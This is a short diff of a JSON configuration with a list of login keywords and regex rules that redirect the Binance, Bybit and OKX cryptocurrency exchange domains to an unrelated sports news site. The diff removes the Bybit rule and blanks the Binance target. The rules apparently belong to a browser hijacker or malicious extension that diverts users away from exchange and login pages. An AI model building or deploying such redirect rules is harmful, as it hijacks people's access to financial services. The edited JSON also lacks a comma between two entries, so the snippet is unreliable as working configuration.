@@ -17,8 +17,7 @@
   ],
   "lgs": ["login","loguin","sign in","entrar"],
   "rds": [
-    {"r":"(www\\.)?binance\\.(com|us).*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?bybit\\.com.*","u":"https://ge.globo.com/"},
+    {"r":"(www\\.)?binance\\.(com|us).*","u":""}
     {"r":"(www\\.)?okx\\.com.*","u":"https://ge.globo.com/"}
 
   ]
